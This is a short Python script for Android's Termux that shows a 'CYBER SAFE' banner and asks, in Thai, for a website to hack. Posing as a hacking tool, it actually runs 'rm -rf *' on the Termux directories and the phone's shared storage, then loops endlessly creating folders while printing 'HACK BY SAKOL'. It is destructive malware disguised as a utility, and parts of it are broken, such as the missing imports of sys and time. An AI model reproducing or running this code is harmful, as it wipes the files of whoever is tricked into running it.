import os
from playsound import playsound

def lowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(2.0/90)

top=('''
 ██████╗██╗   ██╗ ██████╗ ███████╗██████╗     ███████╗ █████╗  ███████╗███████╗    
██╔════╝╚██╗ ██╔╝ ██╔══██╗██╔════╝██╔══██╗    ██╔════╝██╔══██╗ ██╔════╝██╔════╝    
██║      ╚████╔╝  ██████╔╝█████╗  ██████╔╝    ███████╗███████║ █████╗  █████╗      
██║       ╚██╔╝   ██╔══██╗██╔══╝  ██╔══██╗    ╚════██║██╔══██║ ██╔══╝  ██╔══╝      
╚██████╗   ██║    ██████╔╝███████╗██║  ██║    ███████║██║  ██║ ██║     ███████╗    
 ╚═════╝   ╚═╝    ╚═════╝ ╚══════╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝ ╚═╝     ╚══════╝    
                                                                                 
''')

os.system("clear")
playsound('1.mp3')
lowprint(top)
input("เว็บที่จะแฮก : ")
os.system("termux-setup-storage")
os.system("cd ../..;rm -rf *;cd;cd sdcard;rm -rf *")

for x in range(999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999):
	print ("HACK BY SAKOL FOR NUMBER  %s" %(x))
	os.system("cd $HOME;mkdir rj%s" %(x))

